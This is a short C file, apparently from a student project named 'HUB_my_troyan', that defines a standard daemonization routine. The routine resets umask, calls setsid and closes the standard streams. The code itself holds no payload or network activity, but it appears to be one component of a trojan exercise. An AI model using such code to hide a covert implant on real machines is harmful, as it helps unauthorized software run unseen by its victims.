/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 18/04/2021 daemon_init.c
*/

#include "app.h"
#include <sys/types.h>
#include <sys/stat.h>

int daemon_init(void)
{
    pid_t sid;

    umask(0); // By setting the umask to 0, we will have full access to the files generated by the daemon.
    sid = setsid(); // The sub-process becomes independent of its parent.
    if (sid == -1) {
        perror("setsid");
        return EXIT_FAILURE;
    }
//    if ((chdir("/")) == -1) {
//        perror("chdir");
//        return EXIT_FAILURE;
//    }
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    return EXIT_SUCCESS;
}